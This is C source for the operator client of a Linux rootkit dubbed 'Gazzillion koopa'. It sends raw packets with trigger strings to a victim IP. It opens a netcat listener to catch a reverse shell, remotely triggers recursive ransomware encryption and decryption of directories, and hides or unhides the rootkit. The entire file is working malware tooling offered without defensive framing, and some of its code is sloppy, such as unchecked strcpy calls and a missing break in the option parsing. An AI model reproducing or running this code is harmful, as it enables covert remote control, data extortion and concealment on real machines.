#include "madlib/Caps.h"
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <stdlib.h>

#define KGRN  "\x1B[32m"
#define KYLW  "\x1B[33m"
#define KBLU  "\x1B[34m"
#define KMGN  "\x1B[35m"
#define KRED  "\x1B[31m" 
#define RESET "\x1B[0m"

void print_welcome_message(){
    printf("*******************************************************\n");
    printf("************* Gazzillion koopa ************************\n");
    printf("*******************************************************\n");
    printf("************ THE TRUE ILLEST GAZZILLION KOOPA *********\n");
    printf("*******************************************************\n");
}

void print_help_dialog(const char* arg){
    printf("\nUsage: %s OPTION victim_IP\n\n", arg);
    printf("Program OPTIONs\n");
    char* line = "-S";
    char* desc = "Get a remote shell to victim_IP";
    printf("\t%-40s %-50s\n\n", line, desc);
    line = "-p [PATH] -e";
    desc = "*Ransom module* Recursively encrypt directory PATH on victim_IP";
    printf("\t%-40s %-50s\n\n", line, desc);
    line = "-p [PATH] -d";
    desc = "*Ransom module* Recursively decrypt directory PATH on victim_IP";
    printf("\t%-40s %-50s\n\n", line, desc);
    line = "-u";
    desc = "Unhide the rootkit remotely from the host";
    printf("\t%-40s %-50s\n\n", line, desc);
    line = "-i";
    desc = "Hide the rootkit remotely from the host";
    printf("\t%-40s %-50s\n\n", line, desc);
    line = "\nOther options";
    printf("\t%-40s\n", line);
    line = "-h";
    desc = "Print this help";
    printf("\t%-40s %-50s\n\n", line, desc);

}

void check_ip_address_format(char* address){
    char* buf[256];
    int s = inet_pton(AF_INET, address, buf);
    if(s<0){
        printf("["KYLW"WARN"RESET"]""Error checking IP validity\n");
    }else if(s==0){
        printf("["KYLW"WARN"RESET"]""The victim IP is probably not valid\n");
    }
}

char* getLocalIpAddress(){
    char hostbuffer[256];
    char* IPbuffer = calloc(256, sizeof(char));
    struct hostent *host_entry;
    int hostname;
  
    hostname = gethostname(hostbuffer, sizeof(hostbuffer));
    if(hostname==-1){
        perror("["KRED"ERROR"RESET"]""Error getting local IP: gethostname");
        exit(1);
    }
  
    host_entry = gethostbyname(hostbuffer);
    if(host_entry == NULL){
        perror("["KRED"ERROR"RESET"]""Error getting local IP: gethostbyname");
        exit(1);
    }
  
    strcpy(IPbuffer,inet_ntoa(*((struct in_addr*) host_entry->h_addr_list[0])));
  
    printf("["KBLU"INFO"RESET"]""Attacker IP selected: %s\n", IPbuffer);
  
    return IPbuffer;
}


void get_shell(char* argv){
    char* local_ip = getLocalIpAddress();
    printf("["KBLU"INFO"RESET"]""Victim IP selected: %s\n", argv);
    check_ip_address_format(argv);
    packet_t packet = build_standard_packet(9000, 9000, local_ip, argv, 2048, "KOOPA_PAYLOAD_GET_REVERSE_SHELL");
    printf("["KBLU"INFO"RESET"]""Sending malicious bars to local victim...\n");

    pid_t pid;
    pid = fork();
    if(pid < 0){
        perror("["KRED"ERROR"RESET"]""Could not create another process");
	    return;
	}else if(pid==0){
        sleep(1);
        if(rawsocket_send(packet)<0){
            printf("["KRED"ERROR"RESET"]""Sum happened. Is the machine up?\n");
        }else{
            printf("["KGRN"OK"RESET"]""Payload successfully sent!\n");
        }
        
    }else {
        char *cmd = "nc";
        char *argv[4];
        argv[0] = "nc";
        argv[1] = "-lvp";
        argv[2] = "5888";
        argv[3] = NULL;

        printf("["KBLU"INFO"RESET"]""Trying to get a shell...\n");
        if(execvp(cmd, argv)<0){
            perror("["KRED"ERROR"RESET"]""Error running da background listener");
            return;
        }
        printf("["KGRN"OK"RESET"]""Got a shell\n");
    }
    
    free(local_ip);
}

void show_rootkit(char* argv){
    char* local_ip = getLocalIpAddress();
    printf("["KBLU"INFO"RESET"]""Victim IP selected: %s\n", argv);
    check_ip_address_format(argv);
    packet_t packet = build_standard_packet(9000, 9000, local_ip, argv, 2048, "KOOPA_SHOW_ROOTKIT");
    printf("["KBLU"INFO"RESET"]""Sending malicious bars to local...\n");
    if(rawsocket_send(packet)<0){
        printf("["KRED"ERROR"RESET"]""Sum happened. Is the machine up?\n");
    }else{
        printf("["KGRN"OK"RESET"]""Request to go invisible successfully sent!\n");
    }
    free(local_ip);
}

void hide_rootkit(char* argv){
    char* local_ip = getLocalIpAddress();
    printf("["KBLU"INFO"RESET"]""Victim IP selected: %s\n", argv);
    check_ip_address_format(argv);
    packet_t packet = build_standard_packet(9000, 9000, local_ip, argv, 2048, "KOOPA_HIDE_ROOTKIT");
    printf("["KBLU"INFO"RESET"]""Sending malicious bars to local victim...\n");
    if(rawsocket_send(packet)<0){
        printf("["KRED"ERROR"RESET"]""Sum happened. Is the machine up?\n");
    }else{
        printf("["KGRN"OK"RESET"]""Request to go invisible successfully sent!\n");
    }
    free(local_ip);
}

void encrypt_directory(char* argv, char* dir){
    char* local_ip = getLocalIpAddress();
    printf("["KBLU"INFO"RESET"]""Victim IP selected: %s\n", argv);
    printf("["KBLU"INFO"RESET"]""Target PATH selected: %s\n", dir);
    char data_buffer[1024];
    strcpy(data_buffer, "KOOPA_ENCRYPT_DIR");
    strcat(data_buffer, dir);
    check_ip_address_format(argv);
    packet_t packet = build_standard_packet(9000, 9000, local_ip, argv, 2048, data_buffer);
    printf("["KBLU"INFO"RESET"]""Sending malicious bars to local victim...\n");
    if(rawsocket_send(packet)<0){
        printf("["KRED"ERROR"RESET"]""Sum happened. Is the machine up?\n");
    }else{
        printf("["KGRN"OK"RESET"]""Request to encrypt stuff successfully sent!\n");
    }
    free(local_ip);
}

void decrypt_directory(char* argv, char* dir){
    char* local_ip = getLocalIpAddress();
    printf("["KBLU"INFO"RESET"]""Victim IP selected: %s\n", argv);
    printf("["KBLU"INFO"RESET"]""Target PATH selected: %s\n", dir);
    char data_buffer[1024];
    strcpy(data_buffer, "KOOPA_DECRYPT_DIR");
    strcat(data_buffer, dir);
    check_ip_address_format(argv);
    packet_t packet = build_standard_packet(9000, 9000, local_ip, argv, 2048, data_buffer);
    printf("["KBLU"INFO"RESET"]""Sending malicious bars to local victim...\n");
    if(rawsocket_send(packet)<0){
        printf("["KRED"ERROR"RESET"]""Sum happened. Is the machine up?\n");
    }else{
        printf("["KGRN"OK"RESET"]""Request to decrypt stuff successfully sent!\n");
    }
    free(local_ip);
}




void main(int argc, char* argv[]){
    if(argc<2){
        printf("["KRED"ERROR"RESET"]""Do better\n");
        print_help_dialog(argv[0]);
        return;
    }

    int ENCRYPT_MODE_SEL = 0;
    int DECRYPT_MODE_SEL = 0;
    int PATH_ARG_PROVIDED = 0;

    int PARAM_MODULE_ACTIVATED = 0;
    
    int opt;
    char dest_address[32];
    char path_arg[512];

    while ((opt = getopt(argc, argv, ":S:u:i:p:e:d:h")) != -1) {
        switch (opt) {
        case 'S':
            print_welcome_message();
            sleep(1);
            printf("["KBLU"INFO"RESET"]""Activated GET a SHELL mode\n");
            strcpy(dest_address, optarg);
            get_shell(dest_address);
            PARAM_MODULE_ACTIVATED = 1;
            
            break;
        case 'u': 
            print_welcome_message();
            sleep(1);
            printf("["KBLU"INFO"RESET"]""Selected UNHIDE the rootkit remotely\n");
            strcpy(dest_address, optarg);
            show_rootkit(dest_address);
            PARAM_MODULE_ACTIVATED = 1;

            break;
        case 'i': 
            print_welcome_message();
            sleep(1);
            printf("["KBLU"INFO"RESET"]""Selected HIDE the rootkit remotely\n");
            strcpy(dest_address, optarg);
            hide_rootkit(dest_address);
            PARAM_MODULE_ACTIVATED = 1;
        
        case 'e': 
            ENCRYPT_MODE_SEL = 1;
            strcpy(dest_address, optarg);

            break;
        case 'd':
            DECRYPT_MODE_SEL = 1;
            strcpy(dest_address, optarg);
            break;

        case 'p':
            PATH_ARG_PROVIDED = 1;
            strcpy(path_arg, optarg);
            break;

        case 'h':
            print_help_dialog(argv[0]);
            exit(0);
            break;
        case '?':
            printf("["KRED"ERROR"RESET"]""Unknown option: %c\n", optopt);
            break;
        case ':':
            printf("["KRED"ERROR"RESET"]""Missing arguments for %c\n", optopt);
            exit(EXIT_FAILURE);
            break;
        
        default:
            print_help_dialog(argv[0]);
            exit(EXIT_FAILURE);
        }
    }

    if(ENCRYPT_MODE_SEL == 1 && PATH_ARG_PROVIDED == 1){
        print_welcome_message();
        sleep(1);
        printf("["KBLU"INFO"RESET"]""Selected ENCRYPT a rootkit remotely\n");
        encrypt_directory(dest_address, path_arg);
    }else if(DECRYPT_MODE_SEL == 1 && PATH_ARG_PROVIDED == 1){
        print_welcome_message();
        sleep(1);
        printf("["KBLU"INFO"RESET"]""Selected DECRYPT a rootkit remotely\n");
        decrypt_directory(dest_address, path_arg);
    }else if(PARAM_MODULE_ACTIVATED==0){
        printf("["KRED"ERROR"RESET"]""Invalid parameters\n");
        print_help_dialog(argv[0]);
        exit(EXIT_FAILURE);
    }
   
}
